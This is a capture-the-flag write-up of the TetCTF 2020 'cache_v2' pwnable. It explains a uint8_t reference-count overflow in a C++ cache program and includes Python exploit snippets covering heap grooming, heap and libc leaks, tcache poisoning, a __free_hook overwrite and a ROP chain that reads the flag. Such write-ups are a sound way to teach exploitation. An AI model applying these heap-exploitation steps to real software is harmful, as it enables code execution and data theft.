# TetCTF 2020 - cache_v2
## Introduction
- **Given files:** `cache`, `cache.cpp`, `libc-2.31.so`, `ld-2.31.so`.
- **Description:** `Flag stored in /home/cache/flag`
- **Category:** Pwnable
- **Summary:** Another `C++` glibc 2.31 heap challenge that is the sequel to `cache_v1`. The source code is also given although the implementation of the system is different from `cache_v1`.

## TL;DR
1. Analyze the source code -> Found that there is a `uint8_t` integer overflow in `refCount`.
2. Create a large cache, duplicate it over and over to overflow `refCount`, then `erase` it -> `unique_ptr` will be deleted and the pointer it's managing will point to `tcache_perthread_struct` -> Can read and write (almost) anywhere on the heap with this.
3. Setup the heap perfectly to exploit.
4. Use OOB read to leak `heap` and `libc`.
5. Use OOB write to poison tcache -> overwrite `__free_hook` into ROP to workaround `seccomp` and read the flag.
   
## Analyzing the source code
This program is a cache management system implemented in C++, its functionalities is the same as `cache_v1`, with the addition of `Duplicate`:
- `Create` a cache with a unique name and (almost) arbitrary positive size (the upper bound is very high).
- `Read` data from a cache at an offset.
- `Write` data to a cache at an offset.
- `Erase` a cache.
- `Duplicate` a cache to another cache with different name, but similar content.

This time, there is no hashing to mess with. Also, the pointer to the content of each cache is now managed by C++ `unique_ptr`. In short, `unique_ptr` will manage a pointer inside itself, and uniquely own it. There is no way other smart pointers can refer to a pointer that a `unique_ptr` is managing.

When a cache is duplicated, the method `reference()` will be called to increase `refCount` by 1, and when it is erased, `release()` will be called to decrease `refCount` by 1. If `refCount` reaches 0, it means that the cache is no longer referred by any existing cache, therefore it will be deleted, along with its `unique_ptr`. There is a bound check that a cache on only be referenced upto `UINT8_MAX`, but here is the bug: the `refCount`'s data type itself is `uint8_t`, so it will never surpass that max, instead, it will `overflow` and go back to 0. Therefore, we can `duplicate` a cache 256 times to make `refCount` rolls back to 1, then `erase` it. Doing that leaves us with an erased cache that has a lot of duplicates referencing to it. This leads to a `use-after-free` bug upon accessing any of those duplicates.

## Erasing a cache with overflowed `refCount`
When we erase a cache, it's `unique_ptr` will also be erased. This structure is also stored on the heap,and the important part is that the pointer that it is managing is stored as the second `QWORD` of the struct. The `unique_ptr` struct is small enough that it will be inserted into `tcache` when it's free, and in `libc 2.31`, when a `tcache` is free, it's second `QWORD` will contain a so-called `key`, which is the pointer to `tcache_perthread_struct` at the start of the heap. Therefore, when we `.get()` from this freed `unique_ptr`, we actually have access to the pointer to that start of the heap. It all happens when we `erase` a large cache whose `refCount` is overflowed, and then we can read/write in a very large range from it. So effectively, we can read and write anywhere on the heap from that point.

## Setup the heap
Again, like `cache_v1`, we setup the heap perfectly for our exploitation, then overflow and erase a large cache:
```python
# Create a victim caches
create("victim1", 0x100)
write("victim1", 0, 8, "A"*8)
create("victim2", 0x100)
write("victim2", 0, 8, "B"*8)

# Create a large cache to duplicate over and over
create("orig", 0x18000)
write("orig", 0, 8, "A"*8)

# Duplicate orig 256 times
for i in range(256):
    #print(i)
    duplicate("orig", "dup_{}".format(i))

# Erase dup_0, orig's unique_ptr will now point at tcache_perthread_struct (top of heap)
erase("dup_0")
```

Notice that I created the `victim` caches first, because it will make them closer to the top, we don't want them to be far after those duplicated caches. The targeted cache size is also set to be very large (`0x18000`). Also, I deleted `dup_0` instead of `orig`, because `orig` is the only one that we can safely read and write from (it's not flagged as a duplicate).

## Leak heap and libc
Simply read a `heap` and a `libc` pointer on the heap, we don't even need to free a large chunk this time because the targeted chunk is already a large one and will be inserted to `unsorted bin`.
```python
# Leak heap
read("orig", 0x11ea8, 8)
heap = u64(r.recv(8)) - 0x11ed0
log.info("heap: {}".format(hex(heap)))

# Leak libc
read("orig", 0x12238, 8)
l.address = u64(r.recv(8)) - 0x1ebbe0
log.info("libc: {}".format(hex(l.address)))
```

## Tcache poisoning
Exactly the same as `cache_v1`: Freeing the two `victim` chunks and we can easily overwrite their `fd` pointer, classic `tcache poisoning`. With that, I now can overwrite `__free_hook` and also have all the leaked addresses in my hands. I could just use my ROP chain that I explained [here](https://blog.efiens.com/post/heap-seccomp-rop/) to read the flag. Note that the `payload` must be put into a cache's `name`, not `content`, because the `name` is what actually got `free()` first when we call `erase`.
```python
# Erase victims, overwrite victim2's fd to __free_hook
erase("victim1")
erase("victim2")
write("orig", 0x120b0, 8, p64(l.symbols["__free_hook"]))

# Build ROP payload
base = heap + 0x2d190             # payload_base (address of the chunk)
payload = b"A"*8                  # <-- [rdi] <-- payload_base
... # read the full payload in my other post or my full script
payload += b"/home/cache/flag"

# Create a cache with payload as its name
create(payload, 0x100)
write(payload, 0, 8, "A"*8)

# Overwrite __free_hook with call_gadget
create("free", 0x100)
write("free", 0, 8, p64(call_gadget))

# Execute the chain
erase(payload)
```

The flag is:
```
TetCTF{https://www.youtube.com/watch?v=RYhKUKzD6IQ}
```

## Appendix
The full exploit is `a.py`.